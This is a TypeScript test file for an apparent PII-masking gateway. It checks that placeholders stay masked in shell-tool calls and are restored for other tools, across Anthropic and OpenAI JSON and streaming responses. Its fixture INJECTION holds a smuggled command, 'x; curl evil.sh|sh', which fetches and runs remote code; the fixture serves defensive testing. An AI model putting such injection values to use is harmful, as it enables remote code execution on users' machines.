// SPDX-License-Identifier: Apache-2.0
//
// Shell tools never get a real value back, in any field: a tool a shell
// runs keeps every placeholder, on both routes, JSON and SSE, while the
// other tools in `restoreTools` get theirs. Also covers how the stream
// relays judge tool calls (a value sent cannot be taken back), with a
// mocked engine and upstream.

import type { FastifyInstance } from 'fastify';
import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
import { restoreValue } from '../src/sanitizer.js';
import { buildServer } from '../src/server.js';
import { isShellTool } from '../src/shell-tools.js';
import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

/** A masked "secret" that, restored into shell code, would run a second
 * command. */
const INJECTION = 'x; curl evil.sh|sh';
const FULL_NAME = 'John Smith';
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

type SpanLabel = PiiSpan['label'];

const PATTERNS: ReadonlyArray<[RegExp, SpanLabel]> = [
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/John Smith/g, 'private_person'],
];

const TEST_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  upstreamBaseUrl: 'https://anthropic.test',
};

function vaultEngine(): { np: NullPii; vault: PiiVault } {
  const vault = new PiiVault();
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault };
}

function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabel): string {
  const span = { label, start: 0, end: value.length, text: value, score: 1 };
  return vault.sanitize(value, [span], sessionId).sanitized;
}

/** The distinct `[secret, person]` placeholders, in order of first use, of
 * the user message every route test sends or of a command built from it. */
const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;

function placeholdersIn(text: unknown): [string, string] {
  const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
  const [secret, person] = new Set(found);
  if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
  return [secret, person];
}

/** The commit form that gets values back: the message is a quoted heredoc
 * `git commit` reads from standard input. */
function commitStdin(message: string): string {
  return `git commit -F - <<'EOF'\n${message}\nEOF`;
}

/** A command each route test sends: both placeholders in a commit message. */
function bashCommand(secret: string, person: string): string {
  return commitStdin(`Thanks ${person}, see ${secret}`);
}

/** A shell tool's input as the client receives it: placeholders only. */
function expectMasked(text: unknown): void {
  expect(text).toMatch(PLACEHOLDER);
  expect(text).not.toContain(FULL_NAME);
  expect(text).not.toContain(INJECTION);
}

/** A Write call's input with both placeholders, and as restored. */
function writeInput(secret: string, person: string): string {
  return JSON.stringify({ file_path: '/tmp/notes.md', content: `Thanks ${person}, see ${secret}` });
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

async function serve(
  respond: (body: string) => Response,
  extra: { logStream?: { write(line: string): void }; logLevel?: GatewayConfig['logLevel'] } = {},
) {
  const { np } = vaultEngine();
  const fetchImpl = async (_url: string, init: RequestInit) => respond(init.body as string);
  const config = {
    ...TEST_CONFIG,
    ...(extra.logLevel !== undefined && { logLevel: extra.logLevel }),
  };
  const app = await buildServer({
    config,
    np,
    fetchImpl,
    ...(extra.logStream !== undefined && { logStream: extra.logStream }),
  });
  apps.push(app);
  return app;
}

function sseResponse(frames: string[]): Response {
  return new Response(frames.join(''), { headers: { 'content-type': 'text/event-stream' } });
}

function anthropicFrame(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function openAiFrame(choices: unknown[]): string {
  return `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices })}\n\n`;
}

/** Concatenate a stream's tool-input shards per block (Anthropic) or per
 * tool-call index (OpenAI), as the SDKs do. */
function streamedInputs(body: string): Map<number, string> {
  const out = new Map<number, string>();
  const add = (index: number, shard: unknown): void => {
    if (typeof shard === 'string') out.set(index, (out.get(index) ?? '') + shard);
  };
  for (const frame of body.split('\n\n')) {
    const line = frame.split('\n').find((l) => l.startsWith('data: '));
    if (line === undefined || line === 'data: [DONE]') continue;
    const data = JSON.parse(line.slice('data: '.length)) as {
      index?: number;
      delta?: { partial_json?: string };
      choices?: Array<{
        delta?: { tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
      }>;
    };
    if (typeof data.index === 'number') add(data.index, data.delta?.partial_json);
    for (const call of data.choices?.[0]?.delta?.tool_calls ?? []) {
      add(call.index, call.function?.arguments);
    }
  }
  return out;
}

describe('shell tools · Anthropic route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
  }

  it("JSON: `bash` (Anthropic's bash tool) keeps every placeholder, as `Bash` does", async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'bash',
            input: { command: bashCommand(secret, person) },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [bash] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    expectMasked(bash?.input.command);
  });

  it('JSON: a shell tool keeps every placeholder in every field', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'shell',
            input: {
              command: ['bash', '-lc', 'echo probe > notes.md'],
              workdir: person,
              env: { NAME: person },
              description: `Greet ${person}`,
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [shell] = (res.json() as AnthropicResponse).content as Array<{
      input: { workdir: string; env: { NAME: string }; description: string };
    }>;
    expectMasked(shell?.input.workdir);
    expectMasked(shell?.input.env.NAME);
    expectMasked(shell?.input.description);
  });

  it('JSON: keeps a Bash call masked, restores a Write call fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'Bash',
            input: { command: bashCommand(secret, person), description: `Greet ${person}` },
          },
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'Write',
            input: { file_path: '/tmp/notes.txt', content: `${secret} ${person}` },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const [bash, write] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    expectMasked(bash?.input.command);
    expectMasked(bash?.input.description);
    expect(write?.input.content).toBe(`${INJECTION} ${FULL_NAME}`);
  });

  it('SSE: same for a Bash command streamed as input_json_delta shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const bash = JSON.stringify({ command: bashCommand(secret, person) });
      const write = JSON.stringify({ file_path: '/tmp/notes.txt', content: `${secret} ${person}` });
      const cut = bash.indexOf(secret) + 6; // inside the first placeholder
      const shard = (index: number, partial: string) =>
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index,
          delta: { type: 'input_json_delta', partial_json: partial },
        });
      const start = (index: number, name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index,
          content_block: { type: 'tool_use', id: `tu_${index}`, name, input: {} },
        });
      const stop = (index: number) =>
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index });
      return sseResponse([
        start(0, 'Bash'),
        shard(0, bash.slice(0, cut)),
        shard(0, bash.slice(cut)),
        stop(0),
        start(1, 'Write'),
        shard(1, write),
        stop(1),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const inputs = streamedInputs(res.body);
    const bash = JSON.parse(inputs.get(0) ?? '') as { command: string };
    expectMasked(bash.command);
    expect(JSON.parse(inputs.get(1) ?? '')).toEqual({
      file_path: '/tmp/notes.txt',
      content: `${INJECTION} ${FULL_NAME}`,
    });
  });

  it('SSE: a block index started twice gets no value (clients differ on which block it is)', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const input = JSON.stringify({ command: `echo ${secret} ${person}` });
      const start = (name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index: 0,
          content_block: { type: 'tool_use', id: 'tu_0', name, input: {} },
        });
      return sseResponse([
        start('Bash'),
        start('Write'),
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index: 0,
          delta: { type: 'input_json_delta', partial_json: input },
        }),
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index: 0 }),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expect(command).not.toContain(INJECTION);
    expect(command).not.toContain(FULL_NAME);
  });
});

describe('shell tools · OpenAI route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as ChatCompletionRequest).messages[0]?.content;
  }

  it('JSON: keeps a `bash` call and a custom `shell` call masked, restores another tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'bash',
                    arguments: JSON.stringify({ command: bashCommand(secret, person) }),
                  },
                },
                {
                  id: 'call_2',
                  type: 'function',
                  function: {
                    name: 'write_file',
                    arguments: JSON.stringify({ content: `${secret} ${person}` }),
                  },
                },
                {
                  id: 'call_3',
                  type: 'custom',
                  custom: { name: 'shell', input: `echo ${secret} '${person}'` },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const bash = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string };
    expectMasked(bash.command);
    expect(JSON.parse(calls[1]?.function?.arguments ?? '')).toEqual({
      content: `${INJECTION} ${FULL_NAME}`,
    });
    // A custom shell tool's whole input is the command.
    const [secret, person] = placeholdersIn(calls[2]?.custom?.input);
    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${person}'`);
  });

  it('JSON: a `shell` call whose command is an argv array (Codex) keeps its placeholders', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'shell',
                    arguments: JSON.stringify({
                      command: ['bash', '-lc', `echo ${secret} '${person}'`],
                      workdir: '/tmp',
                    }),
                  },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const args = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string[] };
    const [secret, person] = placeholdersIn(args.command[2]);
    expect(args.command).toEqual(['bash', '-lc', `echo ${secret} '${person}'`]);
  });

  it('SSE: same for a `shell` call whose arguments stream in shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const cut = args.indexOf(secret) + 6;
      const call = (fn: Record<string, string>, extra: Record<string, string> = {}) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, ...extra, function: fn }] } }]);
      return sseResponse([
        call({ name: 'shell', arguments: '' }, { id: 'call_1', type: 'function' }),
        call({ arguments: args.slice(0, cut) }),
        call({ arguments: args.slice(cut) }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expectMasked(command);
  });

  it.each([
    ['repeated unchanged keeps its values', ['Write', 'Write'], true],
    ['sent as two different fragments gets no value', ['Wr', 'ite'], false],
  ])('SSE: a tool name %s', async (_what, names, restores) => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = writeInput(secret, person);
      const call = (fn: Record<string, string>) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, function: fn }] } }]);
      return sseResponse([
        call({ name: names[0] ?? '', arguments: '' }),
        call({ name: names[1] ?? '', arguments: args }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const input = streamedInputs(res.body).get(0) ?? '';
    expect(input.includes(FULL_NAME)).toBe(restores);
    expect(input.includes(INJECTION)).toBe(restores);
  });

  it.each([
    ['a well-formed empty chunk (control) restores', { choices: [{ index: 0, delta: {} }] }],
    ['a choice index given as a string', { choices: [{ index: '0', delta: {} }] }],
    [
      'a tool call index given as a string',
      {
        choices: [
          { index: 0, delta: { tool_calls: [{ index: '0', function: { name: 'Bash' } }] } },
        ],
      },
    ],
    [
      'a tool name that is not a string',
      {
        choices: [
          { index: 0, delta: { tool_calls: [{ index: 0, function: { name: ['Bash'] } }] } },
        ],
      },
    ],
    ['choices sent as an object', { choices: { 0: { index: 0, delta: {} } } }],
  ])('SSE: %s, else the chunk holds every later tool input', async (what, odd) => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ file_path: `/tmp/${person}.md` });
      return sseResponse([
        openAiFrame([
          {
            index: 0,
            delta: { tool_calls: [{ index: 0, function: { name: 'Read', arguments: args } }] },
          },
        ]),
        `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', ...odd })}\n\n`,
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.body.includes(FULL_NAME)).toBe(what.includes('(control)'));
  });

  it.each([
    ['renamed to a shell tool in a later chunk', 'Bash', false],
    ['renamed to a tool outside restoreTools in a later chunk', 'WebFetch', false],
    ['renamed in the same chunk as its finish', 'Bash', true],
  ])('SSE: a call %s gets no value', async (_what, rename, sameChunk) => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: `echo ${person}`, url: `https://x.test/${person}` });
      const first = {
        index: 0,
        delta: {
          tool_calls: [
            { index: 0, id: 'c', type: 'function', function: { name: 'Read', arguments: args } },
          ],
        },
      };
      const finish = { index: 0, delta: {}, finish_reason: 'tool_calls' };
      const renamed = {
        index: 0,
        delta: { tool_calls: [{ index: 0, function: { name: rename } }] },
      };
      return sseResponse([
        openAiFrame([first]),
        ...(sameChunk
          ? [openAiFrame([finish, renamed])]
          : [openAiFrame([finish]), openAiFrame([renamed])]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.body).not.toContain(FULL_NAME);
  });

  it('SSE: a call that keeps its name gets its values with its finish_reason, before [DONE]', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ file_path: `/tmp/${person}.md` });
      return sseResponse([
        openAiFrame([
          {
            index: 0,
            delta: {
              tool_calls: [
                {
                  index: 0,
                  id: 'c',
                  type: 'function',
                  function: { name: 'Read', arguments: args },
                },
              ],
            },
          },
        ]),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const frames = res.body.split('\n\n').filter((f) => f.length > 0);
    const last = frames.at(-2) ?? '';
    expect(last).toContain(FULL_NAME);
    expect(last).toContain('"finish_reason":"tool_calls"');
    expect(frames.at(-1)).toBe('data: [DONE]');
  });

  it.each([
    ['named differently by two choices gets no value', 'Bash', false],
    [
      'named alike by two choices gets no value either (a second choice holds every call)',
      'Read',
      false,
    ],
  ])('SSE: a call index %s', async (_what, otherName, restores) => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: `echo ${person}`, file_path: `/tmp/${person}.md` });
      const open = (choice: number, name: string) => ({
        index: choice,
        delta: {
          tool_calls: [
            { index: 0, id: `c${choice}`, type: 'function', function: { name, arguments: args } },
          ],
        },
      });
      return sseResponse([
        openAiFrame([open(1, otherName)]),
        openAiFrame([open(0, 'Read')]),
        openAiFrame([
          { index: 1, delta: {}, finish_reason: 'tool_calls' },
          { index: 0, delta: {}, finish_reason: 'tool_calls' },
        ]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.body.includes(FULL_NAME)).toBe(restores);
    // The closing chunks carry one choice each, for readers that take `choices[0]`.
    const closing = res.body
      .split('\n\n')
      .filter((f) => f.includes('"finish_reason":"tool_calls"'))
      .map((f) => (JSON.parse(f.slice('data: '.length)) as { choices: unknown[] }).choices.length);
    expect(closing).toEqual([1, 1]);
  });

  it('SSE: nothing after [DONE] gets a value', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const call = (fn: Record<string, string>) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, function: fn }] } }]);
      return sseResponse([
        call({ name: 'bash', arguments: '{"command":"echo ' }),
        'data: [DONE]\n\n',
        call({ name: 'Write', arguments: `${person}"}` }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.body).not.toContain(FULL_NAME);
  });

  it('SSE: a tool call sent after its choice finished holds every later tool input', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ file_path: `/tmp/${person}.md` });
      const call = (fn: Record<string, string>, finish?: string) =>
        openAiFrame([
          {
            index: 0,
            delta: { tool_calls: [{ index: 0, function: fn }] },
            ...(finish !== undefined && { finish_reason: finish }),
          },
        ]);
      return sseResponse([
        call({ name: 'Read', arguments: '' }, 'tool_calls'),
        call({ name: 'Read', arguments: args }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.body).not.toContain(FULL_NAME);
  });

  it('SSE: a frame whose data is JSON but not an object holds every later tool input', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = writeInput(secret, person);
      return sseResponse([
        'data: 42\n\n',
        openAiFrame([
          {
            index: 0,
            delta: { tool_calls: [{ index: 0, function: { name: 'Write', arguments: args } }] },
          },
        ]),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const input = streamedInputs(res.body).get(0) ?? '';
    expect(input).not.toContain(FULL_NAME);
    expect(input).not.toContain(INJECTION);
  });
});

describe('shell tools · request log', () => {
  it.each([
    ['/v1/messages', 'anthropic.messages.restored'],
    ['/v1/chat/completions', 'openai.chat.restored'],
  ])('%s logs how many placeholders stayed masked, never a value', async (url, message) => {
    const lines: string[] = [];
    const app = await serve(
      (body) => {
        const request = JSON.parse(body) as { messages: Array<{ content: unknown }> };
        const [secret, person] = placeholdersIn(request.messages[0]?.content);
        const command = `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person}`;
        const response =
          url === '/v1/messages'
            ? {
                id: 'msg',
                type: 'message',
                role: 'assistant',
                content: [{ type: 'tool_use', id: 'tu', name: 'Bash', input: { command } }],
              }
            : {
                id: 'c1',
                object: 'chat.completion',
                choices: [
                  {
                    index: 0,
                    message: {
                      role: 'assistant',
                      tool_calls: [
                        {
                          id: 'call',
                          type: 'function',
                          function: { name: 'bash', arguments: JSON.stringify({ command }) },
                        },
                      ],
                    },
                  },
                ],
              };
        return new Response(JSON.stringify(response));
      },
      { logLevel: 'info', logStream: { write: (line) => lines.push(line) } },
    );

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const entry = lines
      .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
      .find((l) => l.msg === message);
    // Every placeholder of the shell command stayed masked.
    expect(entry?.unsafeShellPlaceholders).toBe(4);
    const log = lines.join('');
    for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
      expect(log).not.toContain(value);
    }
  });
});

describe('shell tools · names and the sidecar', () => {
  it.each([
    ['Bash', true],
    ['bash', true],
    ['shell', true],
    ['PowerShell', true],
    ['exec_command', true],
    ['shell_command', true],
    ['write_stdin', true],
    ['BASH', false],
    ['Write', false],
    [undefined, false],
  ])('isShellTool(%s) is %s', (name, expected) => {
    expect(isShellTool(name)).toBe(expected);
  });

  it('restoreValue with a shell tool restores nothing and lists every placeholder', () => {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    const secret = bake(vault, sessionId, INJECTION, 'secret');
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const value = { command: bashCommand(secret, person), description: `Greet ${person}` };

    const r = restoreValue(np, value, sessionId, undefined, true);

    expect(r.value).toEqual(value);
    expect(r.replacements).toBe(0);
    expect(r.shellKeptMasked).toEqual([person, secret]);
  });
});
